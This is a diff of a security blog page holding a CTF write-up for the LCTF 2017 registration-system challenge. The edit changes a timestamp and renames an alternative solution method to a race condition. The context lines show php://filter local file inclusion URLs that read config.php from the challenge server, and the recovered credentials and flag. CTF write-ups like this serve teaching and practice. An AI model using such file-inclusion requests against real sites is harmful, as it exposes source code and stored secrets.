@@ -97,7 +97,7 @@
 <meta property="og:url" content="/2017/11/21/Write-Up LCTF萌萌哒报名系统/index.html">
 <meta property="og:site_name" content="Ꭰ&#39;s security blog">
 <meta property="og:description" content="题目大概是这样的：  天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD? http://123.206.120.239/">
-<meta property="og:updated_time" content="2017-11-21T06:17:08.000Z">
+<meta property="og:updated_time" content="2017-11-21T06:20:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Write-Up LCTF萌萌哒报名系统">
 <meta name="twitter:description" content="题目大概是这样的：  天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD? http://123.206.120.239/">
@@ -407,7 +407,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://123.206.120.239/member.php?file=php://filter/read=convert.base64-encode/resource=config.php</div><div class="line">http://123.206.120.239/member.php?file=php://filter/read=string.toupper/resource=config.php</div></pre></td></tr></table></figure>
 <p>最后拿到<code>flag</code> </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?PHP</span></div><div class="line">$USER = <span class="string">"XDSEC"</span>;</div><div class="line">$PASS = <span class="string">"XDSEC"</span>;</div><div class="line">$FLAG = <span class="string">"LCTF&#123;PR3_MATCH_1S_A_AMAZ1NG_FUNCTION&#125;"</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>PS：还有一种解法叫做竞猜破解，就是破解str_shuffle的伪随机，但目前没有公开的代码。这里有篇<a href="https://xianzhi.aliyun.com/forum/topic/1520/" target="_blank" rel="external">Paper</a>可以参考。</p>
+<p>PS：还有一种解法叫做条件竞争，就是破解str_shuffle的伪随机，但目前没有公开的代码。这里有篇<a href="https://xianzhi.aliyun.com/forum/topic/1520/" target="_blank" rel="external">Paper</a>可以参考。</p>
 
       
     </div>
